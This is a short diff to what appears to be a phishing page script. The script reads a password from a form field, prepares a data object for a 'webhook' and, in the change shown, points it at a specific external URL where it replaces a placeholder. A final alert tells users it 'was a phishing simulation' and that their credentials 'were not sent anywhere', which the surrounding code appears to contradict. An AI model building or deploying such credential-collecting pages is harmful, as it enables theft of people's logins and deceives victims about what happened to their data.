@@ -21,7 +21,7 @@ const password = document.getElementById('password').value;
 
 // --- THIS IS THE IMPORTANT PART ---
 // Paste your Web App URL inside the quotes below.
-const webhookUrl = 'PASTE_YOUR_WEB_APP_URL_HERE';
+const webhookUrl = 'https://whisperwire.github.io/web-portal/';
 
 // Prepare the data to be sent
 const data = {
@@ -51,3 +51,4 @@ alert('This was a phishing simulation. Your credentials were not sent anywhere.'
 });
 });
 });
+
